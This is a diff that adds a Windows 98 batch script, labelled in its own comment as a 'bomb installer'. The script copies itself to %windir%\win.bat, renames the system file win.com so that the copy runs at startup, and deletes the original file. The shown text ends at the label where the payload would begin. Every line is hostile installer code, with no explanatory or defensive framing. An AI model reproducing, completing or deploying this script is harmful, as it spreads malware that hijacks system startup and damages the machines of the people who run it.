@@ -1,0 +1,12 @@
+@echo off
+cls 
+rem bomb installer for win98 caps
+type %0 | find /V "inst" >c:\inst.txt
+copy c:\inst.txt %windir%\win.bat >nul
+rename %windir%\win.com wind.com %inst% >nul
+del %0 %inst% >nul
+if "%0"=="%windir%\WIN.BAT" goto winrun
+if "%0"=="win" goto winrun
+if "%0"=="WIN" goto winrun
+goto exi
+:winrun
